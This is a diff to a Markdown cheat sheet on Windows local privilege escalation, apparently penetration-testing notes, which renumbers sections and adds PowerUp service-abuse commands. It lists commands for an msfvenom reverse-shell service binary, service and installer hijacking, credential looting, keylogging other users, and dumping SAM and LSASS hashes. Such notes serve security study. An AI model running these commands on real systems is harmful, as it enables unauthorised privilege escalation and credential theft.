@@ -3,26 +3,32 @@ title: Windows local privilege-escalation
 ---
 
 - [1. Automatic tools](#1-automatic-tools)
-- [2. Misconfigurations](#2-misconfigurations)
-  - [2.1. Scheduled tasks](#21-scheduled-tasks)
-  - [2.2. Services](#22-services)
-  - [2.3. Modifiable Service File](#23-modifiable-service-file)
-  - [2.4. AlwaysInstallElevated](#24-alwaysinstallelevated)
-  - [2.5. Users](#25-users)
-- [3. Credentials looting](#3-credentials-looting)
-  - [3.1. Files](#31-files)
-  - [3.2. Shell history](#32-shell-history)
-  - [3.3. Credential Manager](#33-credential-manager)
-  - [3.4. SSH software](#34-ssh-software)
-  - [3.5. Credentials keylogging](#35-credentials-keylogging)
-- [4. NT hash extraction](#4-nt-hash-extraction)
-  - [4.1. From local SAM](#41-from-local-sam)
-  - [4.2. From LSASS memory](#42-from-lsass-memory)
-- [5. Bypassing UAC](#5-bypassing-uac)
-  - [5.1. Auto-elevation](#51-auto-elevation)
-  - [5.2. Scheduled tasks \& environment vars](#52-scheduled-tasks--environment-vars)
-- [6. Insecure Features](#6-insecure-features)
-  - [6.1. CI/CD software](#61-cicd-software)
+- [2. Scheduled tasks](#2-scheduled-tasks)
+- [3. Services](#3-services)
+  - [3.1. Executable permissions](#31-executable-permissions)
+  - [3.2. Unquoted paths](#32-unquoted-paths)
+  - [3.3. Modifiable Service](#33-modifiable-service)
+  - [3.4. Modifiable Service File](#34-modifiable-service-file)
+- [4. AlwaysInstallElevated](#4-alwaysinstallelevated)
+- [5. Users](#5-users)
+  - [5.1. SeBackup and SeRestore](#51-sebackup-and-serestore)
+  - [5.2. SeTakeOwnership](#52-setakeownership)
+  - [5.3. SeImpersonate and SeAssignPrimaryToken](#53-seimpersonate-and-seassignprimarytoken)
+  - [5.4. Unpatched software](#54-unpatched-software)
+- [6. Credentials looting](#6-credentials-looting)
+  - [6.1. Files](#61-files)
+  - [6.2. Shell history](#62-shell-history)
+  - [6.3. Credential Manager](#63-credential-manager)
+  - [6.4. SSH software](#64-ssh-software)
+  - [6.5. Credentials keylogging](#65-credentials-keylogging)
+- [7. NT hash extraction](#7-nt-hash-extraction)
+  - [7.1. From local SAM](#71-from-local-sam)
+  - [7.2. From LSASS memory](#72-from-lsass-memory)
+- [8. Bypassing UAC](#8-bypassing-uac)
+  - [8.1. Auto-elevation](#81-auto-elevation)
+  - [8.2. Scheduled tasks \& environment vars](#82-scheduled-tasks--environment-vars)
+- [9. Insecure Features](#9-insecure-features)
+  - [9.1. CI/CD software](#91-cicd-software)
 
 ## 1. Automatic tools
 
@@ -30,10 +36,9 @@ title: Windows local privilege-escalation
 - [PrivescCheck](https://github.com/itm4n/PrivescCheck)
 - [WES-NG](https://github.com/bitsadmin/wesng) - run `systeminfo` and check for misconfiguration offline using `wes.py` script.
 - Metasploit: `multi/recon/local_exploit_suggester` (when the shell is already established).
+- [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) - `Invoke-AllChecks`.
 
-## 2. Misconfigurations
-
-### 2.1. Scheduled tasks
+## 2. Scheduled tasks
 If an attacker is able to modify the `Task To Run` file, he can run a code with `Run As User` privileges.
 
 ```powershell
@@ -44,29 +49,29 @@ schtasks /query /tn <task-name> /fo list /v
 icacl <path>
 ```
 
-### 2.2. Services
+## 3. Services
 
 ```bash
 # Generate rev-shell service executable
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f exe-service -o my-service.exe
 ```
 
-#### Executable permissions
+### 3.1. Executable permissions
 The executable associated with a service might have insecure permissions. The attacker modifing or replacing the executable can gain the privileges of the service's account.
 
 ```powershell
 icacls <executable-path>                    # Show DACL of the executable
 ```
 
-#### Unquoted paths
-If the service's executable points to an unquoted path with spaces, SCM tries to execute firt binary which is the first part of the unqoted path. This SCM feature is basically disgusting but it works like that. It  allows an attacker to put malicious service binary in the "wrong" path and run it before a legit one will be executed.
+### 3.2. Unquoted paths
+If the service's executable points to an unquoted path with spaces, SCM tries to execute firt binary which is the first part of the unqoted path. This SCM feature is basically disgusting but it works like that. It allows an attacker to put malicious service binary in the "wrong" path and run it before a legit one will be executed.
 
 Example:
 
 ```text
-Path        : C:\MyPrograms\Disk Sorter.exe
-Executed 1st: C:\MyPrograms\Disk.exe
-Executed 2nd: C:\MyPrograms\Disk Sorter.exe
+Path        :   C:\MyPrograms\Disk Sorter.exe
+Executed 1st:   C:\MyPrograms\Disk.exe
+Executed 2nd:   C:\MyPrograms\Disk Sorter.exe
 ```
 
 ```powershell
@@ -76,8 +81,10 @@ Get-ServiceUnqoated -Verbose                # List unquoted paths
 
 > **NOTE**: To drop an executable in the root `C:\` directory you need to actually fhave admin privileges so the unquoted `C:\Program Files (x86)\...` is basically useless.
 
-#### Modifiable Service
+### 3.3. Modifiable Service
 The service ACL might allow to reconfigure service settings. This allows an attacker to point a malicious executable to the service and even change the account which the executable is run with.
+
+> **NOTE**: By changing service binary path to a _cmd_ command, it is possible to execute shell command after service restart.
 
 To check a service ACL the [Accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) tool might be necessary.
 
@@ -89,9 +96,12 @@ sc.exe config <svc-name binPath= "<exe-path" obj= LocalSystem
 
 # PowerUp module
 Get-ModifiableService -Verbose              # List modifiable services
+
+# PowerUp - abuse :service and add :user to local Administrators group
+Invoke-ServiceAbuse -Name <service> -UserName <user>
 ```
 
-### 2.3. Modifiable Service File
+### 3.4. Modifiable Service File
 Sometimes it might be possible to modify binary which is run as a service.
 
 ```powershell
@@ -99,7 +109,7 @@ Sometimes it might be possible to modify binary which is run as a service.
 Get-ModifiableServiceFile -Verbose          # List modifiable service files
 ```
 
-### 2.4. AlwaysInstallElevated
+## 4. AlwaysInstallElevated
 `.msi` files are used to install applications on the system. They usually run with the privileges of the current user but sometimes it might be configured to run installation files with higher privileges from any user account. Malicious `.msi` files can be generated using `msfvenom` tool.
 
 ```powershell
@@ -111,7 +121,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
 msiexec /quiet /qn /i <path>
 ```
 
-### 2.5. Users
+## 5. Users
 Every user has some privileges and some of them might be used to perform privilege escalation:
 
 - [List of all possible privileges](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
@@ -119,10 +129,10 @@ Every user has some privileges and some of them might be used to perform privile
 
 Check current privileges: `whoami /priv`
 
-#### 2.4.1. SeBackup and SeRestore
+### 5.1. SeBackup and SeRestore
 The `SeBackup` and `SeRestore` allow a user to read and write to **any file in the system**, ignoring any DACL. They are used to perform full backup of the system without requiring full admin privileges. Using these privileges an attacker is able to export SAM database and extract users hashes offline. More in: `post-exploitation`.
 
-#### 2.4.2. SeTakeOwnership
+### 5.2. SeTakeOwnership
 The `SeTakeOwnership` privilege allows a user to take ownership of any object on the system. An attacker can search for a service running as SYSTEM and take ownership of the service's executable.
 
 ```powershell
@@ -135,21 +145,21 @@ icacls <file> /grant <username>:F
 # Now you can replace this file with an malicious executable
 ```
 
-#### 2.4.3. SeImpersonate and SeAssignPrimaryToken
+### 5.3. SeImpersonate and SeAssignPrimaryToken
 These privileges allow a process to act on behalf of another user. It usually consists of being able to spawn a process under the security context of another user.
 
 TBD...
 
-#### 2.4.4. Unpatched software
+### 5.4. Unpatched software
 
 ```powershell
 # List the installed software
 wmic product get name,version,vendor
 ```
 
-## 3. Credentials looting
+## 6. Credentials looting
 
-### 3.1. Files
+### 6.1. Files
 
 #### 3.1.1. IIS configuration
 Configuration files of the IIS web server might store some credentials.
@@ -170,7 +180,7 @@ C:\Windows\system32\sysprep.inf
 C:\Windows\system32\sysprep\sysprep.xml
 ```
 
-### 3.2. Shell history
+### 6.2. Shell history
 
 ```powershell
 # To read history from cmd.exe
@@ -182,7 +192,7 @@ type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Conso
 type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
-### 3.3. Credential Manager
+### 6.3. Credential Manager
 Credential Manager is a feature that stores logon-sensitive information for websites, applications, and networks. It's some kind of an OS-level vault for saved passwords. It contains:
 
 - web credentials
@@ -217,7 +227,7 @@ runas /savecred /user:<DOMAIN>\<USER> cmd.exe
 
 > **NOTE**: Even if the credentials are not shown, you can use the `runas /savecred /user:<user> cmd.exe` command in order to use them from a memory.
 
-### 3.4. SSH software
+### 6.4. SSH software
 PuTTY is probably the most common SSH client for Windows in use. It often stores session parameters (e.g. proxy configuration) in the Windows registry.
 
 ```powershell
@@ -225,7 +235,7 @@ PuTTY is probably the most common SSH client for Windows in use. It often stores
 reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 ```
 
-### 3.5. Credentials keylogging
+### 6.5. Credentials keylogging
 If we already have SYSTEM privileges in the OS we can set a keylogger on sessions of another user to steal their credentials.
 
 ```powershell
@@ -249,9 +259,9 @@ Use `meterpreter` session:
 > keyscan_dump
 ```
 
-## 4. NT hash extraction
+## 7. NT hash extraction
 
-### 4.1. From local SAM
+### 7.1. From local SAM
 SAM (Security Account Manager) is a database with all the **local user** accounts and passwords. It acts as a database. Passwords, which are stored in the SAM, are hashed. SAM data is used by LSASS to verify user credentials.
 
 #### 4.1.1. Mimiktaz
@@ -299,7 +309,7 @@ It can be done using `metasploit` framework as well:
 > hashdump
 ```
 
-### 4.2. From LSASS memory
+### 7.2. From LSASS memory
 LSASS (_Local Security Authority Subsystem Service_) is a process running on every Windows OS. It verifies users logging, handles password changes, creates access tokens, writes to the Windows Security Log. In a domain environment LSASS communicates with a Domain Controller. It manages NTLM, Kerberos, NetLogon authentication. It's not possible to use Windows without `lsass.exe` running. An attacker is able to dump the LSASS process memory and retrieve NT hashes.
 
 Tips:
@@ -320,19 +330,19 @@ If there is no LSA, the LSASS memory can be dumped using `Sysinternals Suite` (i
 procdump.exe -accepteula -ma lsass.exe <DUMP_FILE>
 ```
 
-## 5. Bypassing UAC
+## 8. Bypassing UAC
 [UACMe - tool to check different UAC bypass techniques](https://github.com/hfiref0x/UACME).
 
-### 5.1. Auto-elevation
+### 8.1. Auto-elevation
 Some executables can auto-elevate to high IL by default, without any user interaction. This applies to most of the Control Panel's functionality and some other built-in executables. To auto-elevate the executable must be signed by the Windows Publisher and must be contained in a trusted directory like `%SystemRoot%/System32` or `%ProgramFiles%/`. Sometimes it must declare `autoElevate` property in the exec manifest file.
 
-### 5.2. Scheduled tasks & environment vars
+### 8.2. Scheduled tasks & environment vars
 TBD
 
-## 6. Insecure Features
+## 9. Insecure Features
 There is various software that is insecure by design. Legit features of the software allow an attacker to escale privileges, e.g. by executing command as an administrator.
 
-### 6.1. CI/CD software
+### 9.1. CI/CD software
 Most of CI/CD software allows to execute some kind of scripts. Most often they work with escaled privileges (local Administrator or even SYSTEM). After successful login to such a software an attacker is able to execute a malicious code as an administator. Credentials usually are not hard to guess or bruteforce. Jenkins doesn't even have anti-brute-force mechanisms.
 
 > **NOTE**: Sometimes direct script execution is not allowed for you but at the same time you are allowed to add an extra deployment step which executes Windows commands. The result will be the same - command execution.
